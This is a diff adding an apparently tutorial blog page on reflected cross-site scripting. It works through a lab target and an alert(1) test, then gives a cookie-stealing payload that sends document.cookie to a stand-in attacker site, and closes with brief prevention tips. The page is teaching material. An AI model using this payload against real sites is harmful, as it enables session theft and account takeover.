@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Reflected Cross Site Scripting</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+        <script src="https://use.fontawesome.com/releases/v5.15.1/js/all.js" crossorigin="anonymous"></script>
+    </head>
+    <body>
+        <nav class="navbar navbar-expand-lg navbar-light bg-light">
+            <a class="navbar-brand" href="index.html">ICON_LOGO</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+              <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNavDropdown">
+              <ul class="navbar-nav">
+                <li class="nav-item">
+                  <a class="nav-link" href="../blog.html">BLOG</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">ABOUT ME</a>
+                  </li>
+              </ul>
+            </div>
+          </nav>
+        <header class="container" id="reflected-xss">
+            <h3>Reflected Cross Site Scripting</h3>
+        </header>
+        <div class="container">
+            <h3>Description:</h3>
+            <p> This type of XSS is called Reflected XSS because exploiting the vulnerability involves crafting a request containing embedded JavaScript that is reflected to the user who makes the request. <br> Attackers can use this functionality to craft a malicious URL. If the victim clicks on it, it can send them the victim's session token or cookie, causing them to take full control of the victim's account.It is also known as a non-perisitent attack as it occurs when a web-page is dynamically generated and displays a user-supplied value in the webpage. As there is a single request and response associated with it, it is also called <strong>First Order XSS</strong>.</p>
+            <p><strong>For example : </strong> Let there be a website <a href="#">10.10.245.124</a> <br>
+               It takes a paramater <strong>name</strong> in its query and displays it in the webpage without any sanitization. <br> 
+               <a href="#">http://10.10.245.124/?name=sorry+page+not+found</a> </p>
+
+               <img class="img-fluid" src="../images/webattacks/reflected-xss-1.jpg" style="margin-bottom: 1rem; border: 2px solid black;">
+               <p>This displays "Sorry page not found" in the web-page. <br> Looking at the HTML source for the returned page, we can see that the application simply copies the value of the <strong>name</strong> parameter in the URL and inserts it into the error page template at the appropriate place. </p>
+                <img src="../images/webattacks/reflected-xss-2.jpg" alt="Page Not found" class="img-fluid" style="margin: 1rem 0 1rem 0; border: 2px solid black;">
+              <p>This behavior of taking user-supplied input and inserting it into the HTML of response page, is one of the signatures of reflected XSS vulnerabilities and <strong>if no filtering/sanitization is performed, the application is certainly vulnerable.</strong></p>
+           <h5>Triggering Refleced XSS</h5>
+           <p>If the above <abbr title="/?name=Sorry+page+not+found">query</abbr> is replaced with <span style="color: tomato;">&lt;script&gt;alert(1)&lt;/script&gt;</span>  and the server doesn't perform any input sanitization, this could trigger a Reflected XSS.</p>
+           <p>For Example : <a href="">http://10.10.245.124/?name=&lt;script&gt;alert(1)&lt;/script&gt;</a></p>
+           <p>Requesting this URL generates an HTML page that contains the following in place of the original message:</p>
+           <img src="../images/webattacks/reflected-xss-3.jpg" alt="Alert Triggered Due to script tags" class="img-fluid" style="margin:1rem 0 1rem 0; border: 2px solid black;"> 
+           <p>As you can see that replacing the value of the <strong>name</strong> paramater, with our crafted value is displayed in the web browser. 
+            <img src="../images/webattacks/reflected-xss-4.jpg" alt="Script in pre tags" class="img-fluid" style="margin:1rem 0 1rem 0; border: 2px solid black;"></p>
+           <p>Now if I send you this URL <a href="#">http://10.10.245.124/&lt;script&gt;document.location="http://www.my-fake-website.com/"+document.cookie;&lt;/script&gt;</a>  <br>Clicking on the link, will trigger a http request to <strong>my-fake-website.com</strong> and shall provide me with your cookie. </p>
+           <p>The payload used was, <strong>document.location = "http://www.my-fake-website.com/"+document.cookie;</strong></p>
+           <p class="text-muted">NOTE : Its not mandatory to own a website to perform this attack. Tools like Burpsuite can help you with this, and even if you have a Public IP you can implement such an attack.You can even try this by registering in certain websites like requestbin, that can help you implement this.</p>
+       </div>
+       <div class=container>
+           <h3>Prevention</h3>
+	   <ul>
+            <li>Sanitize the user input.Check for special characters like &,&lt;&gt; being input by the user.</li>
+	       <li>Use Black-list filtering.</li>
+	       <li>Use functions like <strong>htmlspecialchars()</strong>.The drawback of the function being that in certain cases, the user needs to input some filtered, which will lose the original data.</li>
+	  </ul>
+       </div>
+    </body>
+</html>
